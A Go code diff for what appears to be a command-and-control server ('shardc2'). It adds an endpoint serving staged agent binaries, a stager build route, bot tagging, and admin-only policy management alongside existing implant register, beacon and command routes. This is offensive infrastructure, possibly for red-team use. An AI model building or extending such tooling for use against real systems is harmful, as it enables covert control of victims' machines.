@@ -44,6 +44,7 @@ type ServerConfig struct {
 	LoginRateLimitMax    int
 	LoginRateLimitWindow time.Duration
 	Policy               policy.Policy
+	PolicyPath           string
 }
 
 type Server struct {
@@ -195,6 +196,16 @@ func (s *Server) setupRoutes() {
 		return c.SendFile("./bin/shardc2-agent", false)
 	})
 
+	api.Get("/agent/stage/:id", binaryAuth, func(c *fiber.Ctx) error {
+		buildID := c.Params("id")
+		var path, status string
+		err := s.db.QueryRow("SELECT COALESCE(artifact_path, ''), status FROM agent_builds WHERE id = $1", buildID).Scan(&path, &status)
+		if err != nil || status != "completed" || path == "" {
+			return c.Status(404).JSON(fiber.Map{"error": "build not found or not ready"})
+		}
+		return c.SendFile(path, false)
+	})
+
 	s.app.Post(p.ServerPath("register"), payloadMW, implantMW, botHandler.Register)
 	s.app.Post(p.ServerPath("beacon"), payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
 	s.app.Get(p.ServerPath("commands"), payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
@@ -244,7 +255,9 @@ func (s *Server) setupRoutes() {
 
 	bots := op.Group("/bots")
 	bots.Get("/", botHandler.List)
+	bots.Get("/tags", botHandler.ListAllTags)
 	bots.Get("/:id", botHandler.Get)
+	bots.Put("/:id/tags", writeGuard, auditAction("bot.set_tags", "bot"), botHandler.SetTags)
 	bots.Delete("/:id", writeGuard, botHandler.Remove)
 
 	cmds := op.Group("/commands")
@@ -286,6 +299,16 @@ func (s *Server) setupRoutes() {
 	op.Get("/safety/status", statusHandler.SafetyStatus)
 	op.Get("/system/info", statusHandler.SystemInfo)
 	op.Get("/audit/events", statusHandler.AuditEvents)
+
+	policyHandler := handlers.NewPolicyHandler(&s.config.Policy, s.config.PolicyPath)
+	op.Get("/policy", policyHandler.Get)
+	op.Put("/policy", func(c *fiber.Ctx) error {
+		role, _ := c.Locals("operator_role").(string)
+		if role != "admin" {
+			return c.Status(403).JSON(fiber.Map{"error": "admin access required"})
+		}
+		return c.Next()
+	}, auditAction("policy.update", "policy"), policyHandler.Update)
 	op.Get("/system/db-stats", statusHandler.DatabaseStats)
 	op.Post("/system/cleanup/dead-bots", writeGuard, auditAction("system.cleanup_bots", "system"), statusHandler.CleanupDeadBots)
 	op.Post("/system/cleanup/stale-commands", writeGuard, auditAction("system.cleanup_commands", "system"), statusHandler.CleanupStaleCommands)
@@ -328,6 +351,7 @@ func (s *Server) setupRoutes() {
 	buildHandler := handlers.NewBuildHandler(s.db, builds.NewLocalBuilder("."))
 	blds := op.Group("/builds")
 	blds.Post("/", auditAction("build.create", "build"), buildHandler.Create)
+	blds.Post("/stager", auditAction("build.create_stager", "build"), buildHandler.CreateStager)
 	blds.Get("/:id", buildHandler.Get)
 	blds.Get("/:id/download", auditAction("build.download", "build"), buildHandler.Download)
 
